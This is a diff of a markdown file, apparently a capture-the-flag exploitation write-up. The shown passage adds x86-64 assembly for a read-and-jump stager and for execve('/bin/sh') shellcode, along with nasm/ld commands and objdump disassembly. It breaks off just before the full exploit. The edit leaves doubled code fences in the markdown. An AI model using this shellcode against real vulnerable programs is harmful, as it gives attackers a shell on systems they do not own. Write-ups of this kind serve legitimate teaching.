@@ -178,9 +178,45 @@ gef➤  x/7i $rip
 Also to assemble the assembly code into opcodes, I just used nasm. Here's an example assembling the assembly file `shellcode.asm`
 
 ```
-$	nasm -f elf64 shellcode.asm
-$	ld -o shellcode shellcode.o
-$	objdump -D shellcode -M intel
+```
+$ cat scan.asm 
+[SECTION .text]
+global _start
+_start:
+  mov dl, 0xff
+  lea rsi, [rel $ +0xffffffffffffffff ] 
+  add rsi, 0x43
+  syscall
+  jmp rsi
+$ cat shellcode.asm 
+[SECTION .text]
+global _start
+_start:
+  mov al, 0x3b
+  lea rdi, [rel $ +0xffffffffffffffff ] 
+  mov rcx, 0x68732f6e69622f
+  mov [rdi], rcx
+  xor rsi, rsi
+  xor rdx, rdx
+  syscall
+$ nasm -f elf64 scan.asm 
+$ ld -o scan scan.o
+$ nasm -f elf64 shellcode.asm 
+$ ld -o shellcode shellcode.o
+$ objdump -D scan -M intel
+
+scan:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000400080 <_start>:
+  400080: b2 ff                 mov    dl,0xff
+  400082: 48 8d 35 f8 ff ff ff  lea    rsi,[rip+0xfffffffffffffff8]        # 400081 <_start+0x1>
+  400089: 48 83 c6 43           add    rsi,0x43
+  40008d: 0f 05                 syscall 
+  40008f: ff e6                 jmp    rsi
+$ objdump -D shellcode -M intel
 
 shellcode:     file format elf64-x86-64
 
@@ -188,14 +224,15 @@ shellcode:     file format elf64-x86-64
 Disassembly of section .text:
 
 0000000000400080 <_start>:
-  400080:	b0 3b                	mov    al,0x3b
-  400082:	48 8d 3d f8 ff ff ff 	lea    rdi,[rip+0xfffffffffffffff8]        # 400081 <_start+0x1>
-  400089:	48 b9 2f 62 69 6e 2f 	movabs rcx,0x68732f6e69622f
-  400090:	73 68 00 
-  400093:	48 89 0f             	mov    QWORD PTR [rdi],rcx
-  400096:	48 31 f6             	xor    rsi,rsi
-  400099:	48 31 d2             	xor    rdx,rdx
-  40009c:	0f 05                	syscall 
+  400080: b0 3b                 mov    al,0x3b
+  400082: 48 8d 3d f8 ff ff ff  lea    rdi,[rip+0xfffffffffffffff8]        # 400081 <_start+0x1>
+  400089: 48 b9 2f 62 69 6e 2f  movabs rcx,0x68732f6e69622f
+  400090: 73 68 00 
+  400093: 48 89 0f              mov    QWORD PTR [rdi],rcx
+  400096: 48 31 f6              xor    rsi,rsi
+  400099: 48 31 d2              xor    rdx,rdx
+  40009c: 0f 05                 syscall 
+```
 ```
 
 Putting it all together, we get the following exploit:
